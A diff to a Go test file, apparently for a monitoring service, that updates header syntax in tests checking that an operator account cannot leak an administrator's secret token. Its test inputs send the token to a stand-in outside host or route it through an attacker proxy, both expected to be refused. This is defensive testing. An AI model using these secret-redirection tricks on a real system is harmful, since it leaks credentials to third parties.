@@ -19,7 +19,7 @@ func TestOperatorCannotUseSecrets(t *testing.T) {
 	}
 	mon := func(name, url string) map[string]any {
 		return map[string]any{"record": map[string]any{"name": name, "type": "HTTP", "target": url,
-			"opts": map[string]string{"header": "Authorization: Bearer ${secret:token}"}}}
+			"opts": map[string]string{"header.Authorization": "Bearer ${secret:token}"}}}
 	}
 	if c := admin.do("POST", "/api/v1/monitors", mon("api", "http://192.168.1.50/health"), nil); c != 200 {
 		t.Fatalf("admin add: %d", c)
@@ -77,18 +77,18 @@ func TestOperatorCannotUseSecretsThroughDefault(t *testing.T) {
 	op := admin.loginAs("op", "secret123")
 	var cfg struct{ Text string }
 	op.do("GET", "/api/v1/config", nil, &cfg)
-	steal := cfg.Text + "$DEFAULT header=\"Authorization: Bearer ${secret:token}\"\nsteal IN HTTP http://203.0.113.9/\n$DEFAULT\n"
+	steal := cfg.Text + "$DEFAULT header.Authorization=\"Bearer ${secret:token}\"\nsteal IN HTTP http://203.0.113.9/\n$DEFAULT\n"
 	if c := op.do("PUT", "/api/v1/config", map[string]any{"text": steal}, nil); c != 403 {
 		t.Fatalf("operator sent a secret through $DEFAULT: %d", c)
 	}
 	// The administrator's check under such a $DEFAULT …
-	withDef := cfg.Text + "$DEFAULT header=\"Authorization: Bearer ${secret:token}\"\napi IN HTTP http://192.168.1.50/health\n$DEFAULT\n"
+	withDef := cfg.Text + "$DEFAULT header.Authorization=\"Bearer ${secret:token}\"\napi IN HTTP http://192.168.1.50/health\n$DEFAULT\n"
 	if c := admin.do("PUT", "/api/v1/config", map[string]any{"text": withDef}, nil); c != 200 {
 		t.Fatalf("admin: %d", c)
 	}
 	op.do("GET", "/api/v1/config", nil, &cfg)
 	// … cannot be sent elsewhere by a $DEFAULT the operator adds above it.
-	moved := strings.Replace(cfg.Text, "$DEFAULT header=", "$DEFAULT proxy=http://203.0.113.9:3128 header=", 1)
+	moved := strings.Replace(cfg.Text, "$DEFAULT header.Authorization=", "$DEFAULT proxy=http://203.0.113.9:3128 header.Authorization=", 1)
 	if moved == cfg.Text {
 		t.Fatal("test text not changed")
 	}
